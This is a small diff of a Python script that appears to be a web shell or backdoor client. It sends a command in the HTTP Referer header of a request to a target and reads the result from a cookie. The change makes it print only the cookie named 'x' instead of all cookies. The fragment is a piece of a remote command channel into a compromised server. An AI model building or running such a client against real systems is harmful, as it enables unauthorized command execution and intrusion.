@@ -44,8 +44,7 @@ def main():
         main()
     else :
         r=requests.get(target, headers={"Referer":cmd})
-        for c in r.cookies:
-            print(unquote(c.value))
+        print(unquote(r.cookies['x'].replace('+',' ')))
         main()
 
 
